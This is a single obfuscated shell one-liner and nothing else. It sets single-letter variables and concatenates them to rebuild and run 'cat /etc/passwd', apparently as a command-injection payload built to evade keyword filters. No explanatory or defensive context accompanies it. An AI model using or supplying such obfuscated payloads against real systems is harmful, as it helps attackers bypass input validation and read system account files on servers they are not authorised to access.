a=c;b=a;d=t;e=/;f=e;g=p;h=s;l=w;m=d;$a$b$d $e$f$d$a$e$g$b$h$h$l$m
